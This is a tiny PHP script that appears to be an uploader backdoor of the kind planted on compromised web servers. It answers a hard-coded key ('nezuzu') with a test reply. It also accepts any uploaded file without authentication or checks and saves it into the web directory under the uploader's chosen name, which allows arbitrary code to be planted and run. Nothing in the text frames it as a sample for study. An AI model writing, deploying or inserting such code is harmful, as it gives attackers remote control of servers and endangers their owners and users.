<?php
if ("nezuzu"==$_GET["key"])
{
 echo "testtrue";
}
if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
{
 move_uploaded_file($_FILES["filename"]["tmp_name"],$_FILES["filename"]["name"]);
 echo "true";
}
?>
